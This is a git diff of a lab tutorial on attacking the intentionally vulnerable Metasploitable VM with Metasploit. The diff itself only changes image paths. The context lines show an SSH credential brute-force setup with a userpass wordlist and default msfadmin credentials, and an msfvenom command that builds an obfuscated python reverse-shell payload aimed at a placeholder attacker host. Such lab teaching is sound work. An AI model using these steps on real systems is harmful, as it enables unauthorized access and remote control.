@@ -272,11 +272,11 @@ Like before, set the `RHOST` to be the target IP address. In addition, we must a
 set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
 ```
 
-![](<../.gitbook/assets/image (9) (3) (1).png>)
+![](<../.gitbook/assets/image (9) (3).png>)
 
 At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:
 
-![](<../.gitbook/assets/image (1) (1) (2).png>)
+![](<../.gitbook/assets/image (1) (1) (2) (1).png>)
 
 {% hint style="info" %}
 You would notice that this is SSH session 3, meaning I did find two other credentials that could be used to SSH to the metasploitable VM. Which ones do you think they are?
@@ -326,7 +326,7 @@ The Metasploit also comes with tools to create vulnerable executable scripts/fil
 msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1) (2).png>)
+![](<../.gitbook/assets/image (3) (1) (1).png>)
 
 The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
